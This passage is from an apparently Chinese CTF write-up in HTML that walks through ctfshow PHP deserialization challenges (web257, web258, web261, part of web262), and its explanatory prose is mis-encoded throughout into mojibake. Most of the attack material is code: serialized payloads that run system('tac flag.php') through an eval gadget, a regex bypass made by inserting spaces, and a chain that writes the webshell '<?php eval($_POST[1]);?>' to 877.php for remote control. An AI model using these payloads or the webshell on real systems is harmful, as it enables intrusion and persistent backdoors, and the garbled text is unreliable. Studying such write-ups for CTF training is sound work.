<p>ç®€å•çš„æ„é€ æ–¹æ³•ï¼Œå°±æ˜¯æŠŠç±»å¤åˆ¶ï¼ŒæŠŠè¯¥åˆ çš„åˆ æ‰å‰©ä¸‹çš„æ”¹å°±è¡Œäº†</p> 
<pre><code class="prism language-php"><span class="token keyword">class</span> ctfShowUser<span class="token punctuation">{<!-- --></span>
    <span class="token comment"># æ²¡ç”¨åˆ°çš„éƒ½å¯ä»¥åˆ æ‰</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment"># ç”¨åˆ°äº†ï¼Œä½†æ˜¯å€¼æ— å…³ç´§è¦</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>

    <span class="token comment"># æ„é€ æ–¹æ³•ï¼Œåˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œé€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œ</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment"># å› ä¸ºä»£ç æ‰§è¡Œå‡½æ•°åœ¨ backDoor ç±»ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ $this-&gt;class=new backDoor();</span>
    <span class="token punctuation">}</span>
    <span class="token comment"># ä¸èƒ½åºåˆ—åŒ–</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment"># ææ„æ–¹æ³•ï¼Œå¯¹è±¡é”€æ¯æ—¶ç”Ÿæ•ˆï¼Œæ‰€ä»¥æ— æ•ˆ</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment"># æ²¡ç”¨åˆ°åˆ å»</span>
<span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment"># è¦åˆ©ç”¨çš„ç±»</span>
<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token comment"># å…³é”®ç‚¹ï¼Œcodeæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œcodeæœ‰å¯ä»¥æ‰§è¡Œä»£ç ï¼Œè¿™é‡Œcode=æ¶æ„ä»£ç </span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token comment"># æ–¹æ³•ä¸èƒ½åºåˆ—åŒ–ï¼Œåˆ é™¤</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>æœ€ç»ˆä»£ç </p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string single-quoted-string">'system("tac flag.php");'</span><span class="token punctuation">;</span>
    <span class="token comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D</span>
</code></pre> 
<p>payload</p> 
<pre><code>getè®¿é—® /?username=xxxxxx&amp;password=xxxxxx
cookie:user=åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²
</code></pre> 
<h4><a id="web258_347"></a>web258-ç©ºæ ¼ç»•è¿‡æ­£åˆ™</h4> 
<p>åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šæ·»åŠ äº†æ­£åˆ™è¿‡æ»¤</p> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>æ­£åˆ™æ„æ€å°±æ˜¯ O:æ•°å­— C:æ•°å­— ç­‰çš„è¿™ç§æƒ…å†µä¸èƒ½å‡ºç°ï¼Œçœ‹ä¸‹åŸæ¥çš„ payload</p> 
<pre><code>O:11:"ctfShowUser":1:{s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
</code></pre> 
<p>å¯ä»¥åœ¨<strong>å†’å·åè¾¹åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡æ­£åˆ™</strong></p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2011</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUserclass<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoorcode<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token function">22system</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">%</span><span class="token number">2</span>Bflag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D
</code></pre> 
<h3><a id="POP_372"></a>POPé“¾</h3> 
<h4><a id="web261__unserialize_374"></a>web261-__unserializeå‡½æ•°</h4> 
<p>å…ˆä¸Šæºç </p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>æ•´ç†ä¸‹é­”æœ¯æ–¹æ³•</p> 
<pre><code class="prism language-php">__construct	æ„é€ å‡½æ•°ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨
    
__wakeup    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å‡½æ•°æ‰§è¡Œæ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆè¢«è°ƒç”¨
    
<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨
    
__sleep		<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<span class="token string backtick-quoted-string">`__sleep`</span>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆè¢«è°ƒç”¨
    
__destruct	ææ„å‡½æ•°æ˜¯ php5 æ–°æ·»åŠ çš„å†…å®¹ï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ
    
<span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•å°†åœ¨ä»»ä½•åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œã€‚å®ƒå¿…é¡»ä»¥ä¸€ä¸ªä»£è¡¨å¯¹è±¡åºåˆ—åŒ–å½¢å¼çš„ é”®<span class="token operator">/</span>å€¼ æˆå¯¹çš„å…³è”æ•°ç»„å½¢å¼æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰è¿”å›æ•°ç»„ï¼Œå°†ä¼šæŠ›å‡ºä¸€ä¸ª TypeError é”™è¯¯
æ³¨æ„ï¼š
å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å’Œ <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«å¿½ç•¥æ‰ã€‚å¦‚æœå¯¹è±¡å®ç°äº† Serializable æ¥å£ï¼Œæ¥å£çš„ <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«å¿½ç•¥ï¼Œåšä¸ºä»£æ›¿ç±»ä¸­çš„ <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«è°ƒç”¨
    
å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å’Œ <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«å¿½ç•¥

<span class="token comment"># __serialize å’Œ __unserialize ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨    </span>
</code></pre> 
<p>å› ä¸ºå­˜åœ¨ <code>__unserialize</code> å‡½æ•°ï¼Œæ‰€ä»¥åœ¨ get ä¼ å…¥ vip çš„å€¼ååºåˆ—åŒ–æ—¶ç›´æ¥è°ƒç”¨ <code>__unserialize</code> è€Œä¸æ˜¯ <code>__wakeup</code> å‡½æ•°</p> 
<p><code>__invoke</code> æ–¹æ³•å­˜åœ¨ä¸­çš„ eval å‡½æ•°ï¼Œä½†æ˜¯å´æ— æ³•åˆ©ç”¨ï¼Œä½†æ˜¯ <code>__destruct</code> æ–¹æ³•ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œå¯ä»¥åˆ©ç”¨å†™å…¥ä¸€å¥è¯æœ¨é©¬</p> 
<p><code>__unserialize</code>å‡½æ•°ä¸­ï¼Œcode = username çš„å€¼æ‹¼æ¥äº† password çš„å€¼</p> 
<pre><code class="prism language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
</code></pre> 
<p>åœ¨ <code>__destruct</code> æ–¹æ³• æ¯”è¾ƒäº† code çš„å€¼ï¼Œä½†æ˜¯æ­¤å¤„æ˜¯åŒç­‰å·å¼±ç±»å‹æ¯”è¾ƒå¯ä»¥ç»•è¿‡</p> 
<pre><code class="prism language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre> 
<p>æ„é€ ä»£ç </p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># æœ€å¥½æ˜¯å…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å†åºåˆ—åŒ–</span>
<span class="token comment"># 877.php==877æ˜¯æˆç«‹çš„ï¼ˆå¼±ç±»å‹æ¯”è¾ƒï¼‰</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># urlencode å°†ä¸å¯è§å­—ç¬¦ç¼–ç </span>
</code></pre> 
<p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œflag åœ¨æ ¹ç›®å½•</p> 
<p>è·Ÿé¢˜ç›®æç¤ºçš„æ‰“ Redis æ²¡æœ‰å…³ç³»çš„</p> 
<h4><a id="web262_484"></a>web262-å­—ç¬¦ä¸²é€ƒé€¸æ›¿æ¢å˜é•¿</h4> 
<p>è´´æºç </p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>é¢˜ç›®æ³¨é‡Šä¸­æœ‰ message.php</p> 
<pre><code class="prism language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
